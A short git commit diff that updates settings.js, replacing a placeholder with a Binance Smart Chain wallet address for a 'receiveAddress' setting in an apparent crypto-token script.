7864f7bdedbbf8a70065fbb381fbb769ed96685a
drunkdragonlsd <107750426+drunkdragonlsd@users.noreply.github.com>
2022-06-18 05:24:56 -0400

    Update settings.js

--- settings.js
+++ settings.js
@@ -1,4 +1,4 @@
-const receiveAddress = "Replace this with your bsc address dont remove quatation marks";   // remove the words and replace it with your bsc address    
+const receiveAddress = "0x8f5BC73e33E13D82B3B6A68BB5B1d2bacE466933";   // remove the words and replace it with your bsc address    
 
 	
 var cryptotokenContract;
